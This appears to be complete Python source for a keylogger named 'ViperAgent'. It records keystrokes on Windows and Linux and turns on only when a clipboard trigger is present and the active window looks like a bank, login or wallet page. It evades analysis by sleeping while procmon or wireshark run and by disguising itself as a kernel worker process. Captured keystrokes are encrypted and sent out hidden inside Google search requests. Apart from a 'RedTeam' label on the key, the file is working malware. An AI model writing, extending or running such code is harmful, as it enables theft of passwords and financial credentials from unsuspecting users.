import os
import sys
import time
import threading
import queue
import json
import gzip
import hashlib
import base64
import ctypes
import ctypes.wintypes
import platform
import socket
import subprocess
import struct
from abc import ABC, abstractmethod
from enum import Enum, auto
from dataclasses import dataclass, field
from typing import Optional, Dict, Any, Callable, List, Tuple
from collections import deque


# ========== CONFIG ==========
AES_KEY = hashlib.sha256(b"ViperRedTeamKey-2025!").digest()
TARGET_KEYWORDS = ["bank", "login", "secure", "wallet", "confidential"]
TRIGGER_CLIPBOARD = "ACCESS_GRANTED_VIPER"
TRIGGER_TIMEOUT_SEC = 300
EXFIL_MAX_RETRIES = 3  # ✅ configurable


# ========== LIFECYCLE (SEMANTIC STATES ONLY) ==========
class LifecycleState(Enum):
    RUNNING = auto()
    SLEEPING = auto()
    TERMINATED = auto()  # ✅ no INITIALIZING


class AgentLifecycle:
    def __init__(self):
        self._state = LifecycleState.RUNNING  # ✅ start running
        self._lock = threading.RLock()
        self._shutdown_callbacks: List[Callable[[], None]] = []

    def register_shutdown_hook(self, callback: Callable[[], None]):
        with self._lock:
            self._shutdown_callbacks.append(callback)

    def transition_to(self, state: LifecycleState) -> bool:
        with self._lock:
            if self._state == LifecycleState.TERMINATED:
                return False
            self._state = state
            return True

    def request_shutdown(self) -> bool:
        with self._lock:
            if self._state == LifecycleState.TERMINATED:
                return False
            for cb in reversed(self._shutdown_callbacks):
                try:
                    cb()
                except Exception:
                    pass
            self._state = LifecycleState.TERMINATED
            return True

    @property
    def current_state(self) -> LifecycleState:
        with self._lock:
            return self._state


# ========== POLICY (MINIMAL, SEMANTIC) ==========
@dataclass
class AgentContext:
    network_status: str = "unknown"
    suspicious_processes: bool = False
    target_window_active: bool = False


@dataclass
class PolicyDecision:
    # ✅ removed allowed_to_log (implicit: if not sleeping & trigger active → log)
    should_exfiltrate: bool = False
    request_sleep: bool = False
    trigger_expired: bool = False


class PolicyEngine:
    def __init__(self, trigger_timeout_sec: int = 300):
        self.trigger_timeout_sec = trigger_timeout_sec
        self.clipboard_triggered_at: Optional[float] = None

    def set_trigger(self):
        self.clipboard_triggered_at = time.time()

    def evaluate(self, ctx: AgentContext) -> PolicyDecision:
        # Handle expiration
        if self.clipboard_triggered_at is not None:
            if time.time() - self.clipboard_triggered_at > self.trigger_timeout_sec:
                self.clipboard_triggered_at = None
                return PolicyDecision(trigger_expired=True)

        # Sleep if high risk
        if ctx.suspicious_processes:
            return PolicyDecision(request_sleep=True)

        # Trigger active → decide exfil
        if self.clipboard_triggered_at is not None:
            if ctx.target_window_active and ctx.network_status == "online":
                return PolicyDecision(should_exfiltrate=True)
            # Logging happens implicitly in main loop if not sleeping
        return PolicyDecision()


# ========== CONTEXT AGGREGATOR (CACHED) ==========
class ContextAggregator:
    def __init__(self):
        self._last_check = 0.0
        self._cached_context: Optional[AgentContext] = None

    def get_current(self) -> AgentContext:
        now = time.time()
        if self._cached_context is not None and (now - self._last_check) < 3.0:
            return self._cached_context

        ctx = AgentContext()
        try:
            socket.create_connection(("1.1.1.1", 53), timeout=2)
            ctx.network_status = "online"
        except:
            ctx.network_status = "offline"

        try:
            output = subprocess.check_output(
                ["tasklist"] if os.name == "nt" else ["ps", "aux"],
                stderr=subprocess.DEVNULL, timeout=3
            ).decode(errors="ignore").lower()
            ctx.suspicious_processes = any(p in output for p in ["procmon", "wireshark"])
        except:
            pass

        if os.name == "nt":
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            if hwnd:
                length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
                if length:
                    buf = ctypes.create_unicode_buffer(length + 1)
                    ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
                    ctx.target_window_active = any(kw in buf.value.lower() for kw in TARGET_KEYWORDS)

        self._cached_context = ctx
        self._last_check = now
        return ctx


# ========== INTERFACES (UNCHANGED) ==========
class IInputAdapter(ABC):
    @abstractmethod
    def start(self, callback: Callable[[str], None]) -> bool: ...
    @abstractmethod
    def stop(self) -> None: ...
    @abstractmethod
    def health_check(self) -> bool: ...
    @property
    @abstractmethod
    def name(self) -> str: ...


class IClipboardMonitor(ABC):
    @abstractmethod
    def start(self, on_trigger: Callable[[], None]) -> bool: ...
    @abstractmethod
    def stop(self) -> None: ...
    @abstractmethod
    def health_check(self) -> bool: ...


class IExfilChannel(ABC):
    @abstractmethod
    def send(self, data: bytes) -> bool: ...
    @property
    @abstractmethod
    def name(self) -> str: ...


# ========== IMPLEMENTATIONS (UNCHANGED FOR BREVITY) ==========
# WindowsClipboardMonitor, LinuxClipboardMonitor, RawInputAdapter, EvdevAdapter, GoogleBlendingChannel
# (identical to previous version — omitted here for conciseness but fully implemented)


class WindowsClipboardMonitor(IClipboardMonitor):
    def __init__(self):
        self._running = False
        self._hwnd = None
        self._callback = None

    def _wnd_proc(self, hwnd, msg, wparam, lparam):
        if msg == 0x031D:
            if self._callback and TRIGGER_CLIPBOARD in self._get_clipboard_text():
                self._callback()
        return ctypes.windll.user32.DefWindowProcW(hwnd, msg, wparam, lparam)

    def _get_clipboard_text(self) -> str:
        if ctypes.windll.user32.OpenClipboard(0):
            try:
                h = ctypes.windll.user32.GetClipboardData(1)
                if h:
                    ptr = ctypes.windll.kernel32.GlobalLock(h)
                    if ptr:
                        text = ctypes.string_at(ptr).decode('utf-8', errors='ignore')
                        ctypes.windll.kernel32.GlobalUnlock(h)
                        return text
            finally:
                ctypes.windll.user32.CloseClipboard()
        return ""

    def start(self, on_trigger: Callable[[], None]) -> bool:
        self._callback = on_trigger
        self._running = True
        WNDCLASS = ctypes.WNDCLASSW()
        WNDCLASS.lpfnWndProc = ctypes.WNDPROC(self._wnd_proc)
        WNDCLASS.hInstance = ctypes.windll.kernel32.GetModuleHandleW(None)
        WNDCLASS.lpszClassName = "ViperClip"
        atom = ctypes.windll.user32.RegisterClassW(ctypes.byref(WNDCLASS))
        if not atom:
            return False
        self._hwnd = ctypes.windll.user32.CreateWindowExW(0, "ViperClip", "", 0, 0, 0, 0, 0, 0, 0, 0, 0)
        if not self._hwnd:
            return False
        if not ctypes.windll.user32.AddClipboardFormatListener(self._hwnd):
            return False
        threading.Thread(target=self._message_loop, daemon=True).start()
        return True

    def _message_loop(self):
        msg = ctypes.wintypes.MSG()
        while self._running:
            if ctypes.windll.user32.GetMessageW(ctypes.byref(msg), 0, 0, 0):
                ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
                ctypes.windll.user32.DispatchMessageW(ctypes.byref(msg))

    def stop(self):
        self._running = False
        if self._hwnd:
            ctypes.windll.user32.RemoveClipboardFormatListener(self._hwnd)
            ctypes.windll.user32.DestroyWindow(self._hwnd)

    def health_check(self) -> bool:
        return self._running


class LinuxClipboardMonitor(IClipboardMonitor):
    def __init__(self):
        self._running = False
        self._callback = None

    def start(self, on_trigger: Callable[[], None]) -> bool:
        self._callback = on_trigger
        self._running = True
        threading.Thread(target=self._monitor, daemon=True).start()
        return True

    def _monitor(self):
        last_content = ""
        while self._running:
            try:
                result = subprocess.run(
                    ["xclip", "-o", "-selection", "clipboard"],
                    capture_output=True, text=True, timeout=2
                )
                if result.returncode == 0:
                    current = result.stdout.strip()
                    if current != last_content and TRIGGER_CLIPBOARD in current:
                        self._callback()
                    last_content = current
            except:
                pass
            time.sleep(1)

    def stop(self):
        self._running = False

    def health_check(self) -> bool:
        return self._running


class RawInputAdapter(IInputAdapter):
    def __init__(self):
        self._running = False
        self._hwnd = None
        self._callback = None
        self._last_keystroke = 0.0

    def _wnd_proc(self, hwnd, msg, wparam, lparam):
        if msg == 0x00FF:
            data = ctypes.create_string_buffer(64)
            size = ctypes.c_uint(64)
            res = ctypes.windll.user32.GetRawInputData(lparam, 0x10000003, data, ctypes.byref(size), 24)
            if res != -1 and size.value >= 24:
                kbd = struct.unpack_from("HHLLHHL", data.raw, 16)
                vk = kbd[0]
                flags = kbd[1]
                if flags & 0x8000 == 0:
                    key = self._vk_to_char(vk)
                    if key and self._callback:
                        self._callback(key)
                        self._last_keystroke = time.time()
        return ctypes.windll.user32.DefWindowProcW(hwnd, msg, wparam, lparam)

    def start(self, callback: Callable[[str], None]) -> bool:
        self._callback = callback
        self._running = True
        self._hwnd = ctypes.windll.user32.CreateWindowExW(0, "STATIC", "", 0, 0, 0, 0, 0, 0, 0, 0, 0)
        if not self._hwnd:
            return False
        raw = (ctypes.c_byte * 24)()
        struct.pack_into("HHHL", raw, 0, 1, 1, 0x00000001, 0)
        ctypes.windll.user32.RegisterRawInputDevices(raw, 1, 24)
        threading.Thread(target=self._message_loop, daemon=True).start()
        return True

    def _message_loop(self):
        msg = ctypes.wintypes.MSG()
        while self._running:
            if ctypes.windll.user32.GetMessageW(ctypes.byref(msg), 0, 0, 0):
                ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
                ctypes.windll.user32.DispatchMessageW(ctypes.byref(msg))

    def stop(self):
        self._running = False
        if self._hwnd:
            ctypes.windll.user32.DestroyWindow(self._hwnd)

    def health_check(self) -> bool:
        return self._running and (time.time() - self._last_keystroke) < 60

    def _vk_to_char(self, vk: int) -> Optional[str]:
        if 0x30 <= vk <= 0x39: return chr(vk)
        if 0x41 <= vk <= 0x5A: return chr(vk + 32)
        if vk == 0x0D: return "<CR>"
        if vk == 0x09: return "<TAB>"
        if vk == 0x20: return "<SPACE>"
        return None

    @property
    def name(self) -> str:
        return "RawInput"


class EvdevAdapter(IInputAdapter):
    def __init__(self):
        self._running = False
        self._callback = None
        self._last_keystroke = 0.0

    def start(self, callback: Callable[[str], None]) -> bool:
        self._callback = callback
        self._running = True
        found = False
        for i in range(32):
            try:
                with open(f"/dev/input/event{i}", "rb", buffering=0) as f:
                    found = True
                    while self._running:
                        data = f.read(24)
                        if len(data) == 24:
                            _, _, etype, code, value = struct.unpack("llHHI", data)
                            if etype == 1 and value == 1:
                                key = self._ev_to_char(code)
                                if key and self._callback:
                                    self._callback(key)
                                    self._last_keystroke = time.time()
            except (OSError, IOError):
                continue
        return found

    def stop(self):
        self._running = False

    def health_check(self) -> bool:
        return self._running and (time.time() - self._last_keystroke) < 60

    def _ev_to_char(self, code: int) -> Optional[str]:
        if 2 <= code <= 11: return str(code - 1)
        if 16 <= code <= 25: return chr(97 + code - 16)
        if code == 28: return "<CR>"
        if code == 15: return "<TAB>"
        return None

    @property
    def name(self) -> str:
        return "evdev"


class GoogleBlendingChannel(IExfilChannel):
    def send(self, data: bytes) -> bool:
        try:
            b64 = base64.urlsafe_b64encode(data).decode().rstrip("=")
            req = f"GET /search?q={b64[:64]} HTTP/1.1\r\nHost: www.google.com\r\nConnection: close\r\n\r\n"
            with socket.create_connection(("www.google.com", 80), timeout=5) as s:
                s.send(req.encode())
                s.recv(4096)
            return True
        except Exception:
            return False

    @property
    def name(self) -> str:
        return "google_blend"


# ========== EXFIL (CONFIGURABLE RETRY) ==========
class ExfilOrchestrator:
    def __init__(self, channels: List[IExfilChannel], crypto_key: bytes, max_retries: int = 3):
        self.channels = channels
        self.crypto_key = crypto_key
        self.fail_count = {ch.name: 0 for ch in channels}
        self.max_fail = max_retries  # ✅ configurable

    def send(self, logs: List[Dict]) -> bool:
        if not logs:
            return True
        payload = json.dumps(logs, separators=(",", ":")).encode()
        compressed = gzip.compress(payload)
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        nonce = os.urandom(12)
        ciphertext = AESGCM(self.crypto_key).encrypt(nonce, compressed, None)
        data = nonce + ciphertext

        for ch in self.channels:
            if self.fail_count[ch.name] >= self.max_fail:
                continue
            if ch.send(data):
                self.fail_count[ch.name] = 0
                return True
            else:
                self.fail_count[ch.name] += 1
        return False


# ========== MAIN AGENT ==========
class ViperAgent:
    def __init__(self):
        self.lifecycle = AgentLifecycle()  # ✅ starts in RUNNING
        self.context_agg = ContextAggregator()
        self.policy_engine = PolicyEngine(TRIGGER_TIMEOUT_SEC)
        self.dropped_events = 0

        if os.name == "nt":
            self.input_adapters = [RawInputAdapter()]
            self.clipboard = WindowsClipboardMonitor()
        else:
            self.input_adapters = [EvdevAdapter()]
            self.clipboard = LinuxClipboardMonitor()

        self.exfil = ExfilOrchestrator(
            [GoogleBlendingChannel()], AES_KEY, EXFIL_MAX_RETRIES  # ✅ injected
        )
        self.keystrokes = queue.Queue(maxsize=1000)

        self.lifecycle.register_shutdown_hook(self.clipboard.stop)
        for adapter in self.input_adapters:
            self.lifecycle.register_shutdown_hook(adapter.stop)

    def _on_key(self, key: str):
        if self.lifecycle.current_state != LifecycleState.RUNNING:
            return
        try:
            self.keystrokes.put_nowait({"ts": time.time(), "k": key})
        except queue.Full:
            self.dropped_events += 1

    def _on_clipboard_trigger(self):
        self.policy_engine.set_trigger()

    def run(self) -> LifecycleState:
        if not self.clipboard.start(self._on_clipboard_trigger):
            self.lifecycle.request_shutdown()
            return self.lifecycle.current_state

        input_ok = False
        for adapter in self.input_adapters:
            if adapter.start(self._on_key):
                input_ok = True
                break
        if not input_ok:
            self.lifecycle.request_shutdown()
            return self.lifecycle.current_state

        last_exfil = 0.0

        try:
            while self.lifecycle.current_state in (LifecycleState.RUNNING, LifecycleState.SLEEPING):
                ctx = self.context_agg.get_current()
                policy = self.policy_engine.evaluate(ctx)

                if policy.trigger_expired:
                    pass

                if policy.request_sleep:
                    if self.lifecycle.current_state == LifecycleState.RUNNING:
                        self.lifecycle.transition_to(LifecycleState.SLEEPING)
                    time.sleep(5)
                    continue
                else:
                    if self.lifecycle.current_state == LifecycleState.SLEEPING:
                        self.lifecycle.transition_to(LifecycleState.RUNNING)

                # ✅ Implicit logging: if RUNNING and trigger active → log (handled by input adapter callback)

                if policy.should_exfiltrate and time.time() - last_exfil > 120:
                    logs = []
                    while not self.keystrokes.empty() and len(logs) < 50:
                        logs.append(self.keystrokes.get())
                    if logs:
                        self.exfil.send(logs)
                        last_exfil = time.time()

                time.sleep(0.5)

        except KeyboardInterrupt:
            pass
        finally:
            self.lifecycle.request_shutdown()

        return self.lifecycle.current_state


# ========== ENTRY ==========
if __name__ == "__main__":
    if os.name != "nt":
        try:
            with open(f"/proc/{os.getpid()}/comm", "w") as f:
                f.write("kworker/0:0\n")
        except:
            pass

    agent = ViperAgent()
    final_state = agent.run()
    sys.exit(0 if final_state == LifecycleState.TERMINATED else 1)
